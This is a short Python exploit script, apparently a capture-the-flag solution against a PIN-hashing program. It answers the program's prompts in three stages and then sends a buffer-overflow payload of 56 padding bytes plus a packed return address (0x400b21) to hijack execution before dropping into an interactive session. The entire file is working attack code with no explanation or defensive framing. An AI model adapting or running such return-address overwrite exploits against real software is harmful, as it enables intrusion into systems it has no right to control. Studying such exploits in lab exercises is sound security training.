import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

## Stage 1
p.readuntil('wish to use:')
p.sendline('31')
p.readuntil('Enter your first name:')
p.sendline('A'*30)
p.readuntil('Enter your last name:')
p.sendline('B'*31)
p.readuntil('Apply PIN Scrambling? [y/n] Continue generating hashes? [y/n]')
p.sendline('y')

## Stage 2
p.readuntil('Enter your first name:')
p.sendline('C'*29)
p.readuntil('Enter your last name:')
p.sendline('D'*31)
p.readuntil('Apply PIN Scrambling? [y/n] Continue generating hashes? [y/n]')
p.sendline('y')


## Stage 3
p.readuntil('Enter your first name:')
p.sendline('C'*30)
p.readuntil('Enter your last name:')
p.sendline('D'*30)
p.readuntil('Apply PIN Scrambling? [y/n]')
p.sendline('y')
p.readuntil('Enter the PIN you wish to use:')
payload = 'A'*56
payload+=p64(0x400b21)
p.sendline(payload)



p.interactive()